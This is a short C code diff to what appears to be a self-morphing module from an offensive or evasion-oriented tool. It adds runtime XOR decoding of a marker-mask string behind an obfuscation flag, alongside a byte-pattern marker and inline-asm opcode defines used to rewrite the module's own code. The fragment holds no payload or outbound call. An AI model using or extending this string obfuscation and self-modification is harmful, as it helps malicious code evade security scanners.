@@ -9,6 +9,9 @@
 #include <psapi.h>
 #include <time.h>
 
+#include "Strings.h"
+#include "Obfuscation.h"
+#include "Utilities.h"
 // Some Functionality based on C++ code from GuidedHacking
 
 #define RAND ((((__TIME__[7] - '0') * 1 + (__TIME__[6] - '0') * 10 \
@@ -48,8 +51,8 @@
 #define MARKER_BYTES "\x9C\x51\x52\x41\x50\x41\x51\x31\xC0\x31\xC0\x31\xDB\x31\xC0\x31\xC0\x41\x59\x41\x58\x5A\x59\x9D"
 // The length of the marker in bytes
 #define MARKER_SIZE 24
-// A string of characters representing which bytes in the marker to search for ("x" means search, any other character means ignore)
-#define MARKER_MASK "xxxxxxxxxxxxxxxxxxxxxxxx"
+// S_MARKER_MASK is a string of characters representing which bytes in the marker to search for ("x" means search, any other character means ignore)
+
 
 // assembler opcode defines for inline asm
 #define ASM_OPCODE_JMP_REL        0xEB
@@ -66,6 +69,17 @@ PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, 
 
 
 void morphModule() {
+#if CONFIG_OBFUSCATION
+
+    unsigned char s_xk[] = S_XK;
+    unsigned char s_string[] = S_MARKER_MASK;
+
+    char * MARKER_MASK = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));
+
+#else
+    char * MARKER_MASK = S_MARKER_MASK;
+#endif
+
     // Declare the MODULEINFO struct to store module information.
     MODULEINFO modInfo;
 
